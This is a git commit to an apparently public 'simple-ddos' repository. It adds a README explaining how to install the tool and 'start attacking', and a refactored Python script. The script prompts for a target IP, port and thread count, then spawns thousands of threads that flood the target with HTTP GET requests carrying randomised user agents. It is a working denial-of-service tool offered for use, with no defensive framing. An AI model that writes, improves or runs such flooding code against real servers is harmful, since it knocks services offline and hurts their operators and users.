c00f5f80d825e210d49d173ef78b24c7bdf0ec61
netbriler <netbriler@gmail.com>
2020-10-28 21:04:37 +0200

    Refactoring

---
+++ README.md
@@ -0,0 +1,9 @@
+# How to install?
+`git clone https://github.com/netBriler/simple-ddos.git`
+
+`cd simple-ddos`
+
+`pip install -r requirements.txt`
+
+# How to start attacking?
+`python ddos.py`
--- ddos.py
+++ ddos.py
@@ -1,24 +1,42 @@
-import threading
-import socket
-import random
 import time
+import socket
+import threading
+from fake_useragent import UserAgent
+from colorama import Fore, init, ansi
 
-H = '\033[95m'
-B = '\033[94m'
-G = '\033[92m'
-W = '\033[93m'
-F = '\033[91m'
-E = '\033[0m'
-U = '\033[4m'
-O = '\033[33m'
-agent = []
-agent.append(
-    "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
-agent.append(
-    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
-agent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
-agent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
-data = '''
+init()
+ansi.clear_screen()
+
+print(
+    f"""{Fore.MAGENTA}
+████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
+█░░░░░░░░░░░░░░███░░░░░░░░░░░░░░░░███░░░░░░░░░░█░░░░░░█████████░░░░░░░░░░░░░░█░░░░░░░░░░░░░░░░██████░░░░░░░░░░░░███░░░░░░░░░░░░███░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█
+█░░▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀░░█░░▄▀░░█████████░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░██████░░▄▀▄▀▄▀▄▀░░░░█░░▄▀▄▀▄▀▄▀░░░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█
+█░░▄▀░░░░░░▄▀░░███░░▄▀░░░░░░░░▄▀░░███░░░░▄▀░░░░█░░▄▀░░█████████░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░▄▀░░██████░░▄▀░░░░▄▀▄▀░░█░░▄▀░░░░▄▀▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░░░░░█
+█░░▄▀░░██░░▄▀░░███░░▄▀░░████░░▄▀░░█████░░▄▀░░███░░▄▀░░█████████░░▄▀░░█████████░░▄▀░░████░░▄▀░░██████░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░█████████
+█░░▄▀░░░░░░▄▀░░░░█░░▄▀░░░░░░░░▄▀░░█████░░▄▀░░███░░▄▀░░█████████░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░▄▀░░██████░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░░░░░█
+█░░▄▀▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░█████░░▄▀░░███░░▄▀░░█████████░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░██████░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█
+█░░▄▀░░░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░░░█████░░▄▀░░███░░▄▀░░█████████░░▄▀░░░░░░░░░░█░░▄▀░░░░░░▄▀░░░░██████░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░░░░░░░░░▄▀░░█
+█░░▄▀░░████░░▄▀░░█░░▄▀░░██░░▄▀░░███████░░▄▀░░███░░▄▀░░█████████░░▄▀░░█████████░░▄▀░░██░░▄▀░░████████░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█████████░░▄▀░░█
+█░░▄▀░░░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░░░░░█░░░░▄▀░░░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░░░█░░▄▀░░██░░▄▀░░░░░░████░░▄▀░░░░▄▀▄▀░░█░░▄▀░░░░▄▀▄▀░░█░░▄▀░░░░░░▄▀░░█░░░░░░░░░░▄▀░░█
+█░░▄▀▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀▄▀▄▀░░█░░▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀▄▀▄▀░░████░░▄▀▄▀▄▀▄▀░░░░█░░▄▀▄▀▄▀▄▀░░░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█
+█░░░░░░░░░░░░░░░░█░░░░░░██░░░░░░░░░░█░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░██░░░░░░░░░░████░░░░░░░░░░░░███░░░░░░░░░░░░███░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█
+████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
+    {Fore.YELLOW}NOTE: CTRL + C If you want to Quit.{Fore.RESET}
+"""
+)
+
+address = ''
+while not address:
+    address = input(f'Ip: ')
+
+port = input(f'Port {Fore.CYAN}(80 by default){Fore.RESET}: ') or 80
+threads = input(f'Threads {Fore.CYAN}(2000 by default){Fore.RESET}: ') or 2000
+
+# Starting fun
+user_agents = UserAgent()
+
+headers = '''
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: en-us,en;q=0.5
 Accept-Encoding: gzip,deflate
@@ -26,36 +44,41 @@ Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
 Keep-Alive: 115
 Connection: keep-alive'''
 
-site = input('Ip: ')
-t = [None] * 2000
-a = [None] * 2000
-l = [None] * 2000
+
+packages = 0
 
 
-def dos():
+def dos() -> None:
+    global packages
+    packages += 1
     while 1:
         try:
+            # Configure packet
+            packet = f'GET / HTTP/1.1\nHost: {address}\n\n User-Agent: {user_agents.random}\n{headers}'
+            packet = packet.encode('utf-8')
+
+            # Sending packet
             s = socket.socket()
-            s.connect((site, 80))
-            packet = str(
-                "GET / HTTP/1.1\nHost: " + site + "\n\n User-Agent: " + random.choice(agent) + "\n" + data).encode(
-                'utf-8')
-            s.sendto(packet, (site, 80))
+            s.connect((address, port))
+            s.sendto(packet, (address, port))
             s.send(packet)
-            print(G + time.ctime(time.time()) + ' Attacking Server->' + site + G)
+
+            # Simple logging
+            current_time = time.ctime(time.time())
+            print(f'{Fore.GREEN}{current_time} Attacking Server->{address}')
         except socket.error:
-            print(time.ctime(time.time()) + ' Attacking Server->' + site)
+            # Simple logging
+            current_time = time.ctime(time.time())
+            print(f'{Fore.RED}{current_time} ERROR Attacking Server->{address}')
 
 
-def dos2():
-    while 1:
+# Here is some shit code
+def dos2() -> None:
+    while True:
         dos()
 
 
-for i in range(2000):
-    t[i] = threading.Thread(target=dos)
-for h in range(2000):
-    l[h] = threading.Thread(target=dos2)
-for k in range(2000):
-    t[k].start()
-    l[k].start()
+# Launching threads
+for i in range(threads):
+    threading.Thread(target=dos).start()
+    threading.Thread(target=dos2).start()
